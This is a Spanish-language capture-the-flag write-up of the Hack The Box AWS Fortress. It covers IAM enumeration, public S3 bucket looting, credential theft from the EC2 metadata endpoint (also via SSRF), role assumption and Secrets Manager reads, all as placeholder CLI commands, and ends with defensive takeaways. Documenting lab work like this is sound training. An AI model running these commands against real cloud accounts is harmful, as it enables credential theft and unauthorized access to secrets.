---
title: "HTB Fortress — Respected by AWS"
date: 2025-03-31
description: "Completion del AWS Fortress en HackTheBox. Entorno diseñado por Amazon Web Services orientado a cloud security: IAM misconfigurations, servicios mal configurados y movimiento lateral en entornos cloud. Rarity: 0.04% de usuarios."
level: "Hard"
platform: "Hack The Box"
category: "Fortress"
duration: "Multi-Flag Challenge"
image: "/images/about/ctf-blue.png"
certId: "aws-fortress-2025"
tags: ["HTB", "Fortress", "AWS", "Cloud Security", "IAM", "S3", "EC2 Metadata", "Role Assumption"]
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Fortress](https://img.shields.io/badge/Fortress-AWS-FF9900?style=for-the-badge)
![Rarity](https://img.shields.io/badge/Rarity-0.04%25-black?style=for-the-badge)
![Team](https://img.shields.io/badge/Team-CyberFlippers-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

---

| Campo | Valor |
|-------|-------|
| Fortress | AWS |
| Badge | Respected by AWS |
| Completado | 31 Mar, 2025 |
| Rarity | **0.04%** de usuarios |

## Sobre AWS

Amazon Web Services es el proveedor de infraestructura cloud más grande del mundo. Su equipo de seguridad diseñó este Fortress para reflejar los errores más comunes — y más peligrosos — que se encuentran en entornos cloud reales.

**Vectores cubiertos:**
- **IAM misconfigurations** — permisos excesivos, roles mal definidos, políticas con wildcards
- **Servicios expuestos** — S3 buckets, metadata service (IMDS), instancias sin restricciones
- **Movimiento lateral en cloud** — encadenamiento de credenciales y roles para escalar privilegios

## Metodología Aplicada

### 1. Reconocimiento con AWS CLI

```bash
# Identificar el usuario/rol actual
aws sts get-caller-identity

# Enumerar permisos disponibles
aws iam list-attached-user-policies --user-name <user>
aws iam get-user-policy --user-name <user> --policy-name <policy>
```

### 2. Enumeración de S3

```bash
# Listar buckets
aws s3 ls

# Acceso público sin credenciales
aws s3 ls s3://<bucket-name> --no-sign-request

# Descargar contenido
aws s3 sync s3://<bucket-name> ./loot/ --no-sign-request

# Bucket policies
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api get-bucket-policy --bucket <bucket-name>
```

### 3. IMDS — EC2 Metadata Service

```bash
# Acceso directo al IMDS (o via SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Retorna: AccessKeyId, SecretAccessKey, Token (temporales)
```

### 4. Escalación via IAM Role Assumption

```bash
# Asumir un rol con más permisos
aws sts assume-role \
    --role-arn "arn:aws:iam::<account>:role/<TargetRole>" \
    --role-session-name "attack-session"

# Configurar nuevas credenciales
export AWS_ACCESS_KEY_ID=<nuevo_access_key>
export AWS_SECRET_ACCESS_KEY=<nuevo_secret>
export AWS_SESSION_TOKEN=<session_token>

# Post-compromise: Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <secret-name>
```

## Key Takeaways

1. **IAM es el nuevo perimeter** — Un identity con permisos excesivos es equivalente a un servidor expuesto sin parches.
2. **El principio de menor privilegio falla en la práctica** — Los errores más comunes son `*` en Action, `*` en Resource, o ambos.
3. **Los secrets no deberían estar en el código** — Secrets Manager y Parameter Store existen para esto.
4. **IMDS v2 mitiga el ataque pero no lo elimina** — Si la aplicación está comprometida, el token IMDSv2 también lo está.

---

<div align="center">

**Flippermen**
*HackTheBox — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
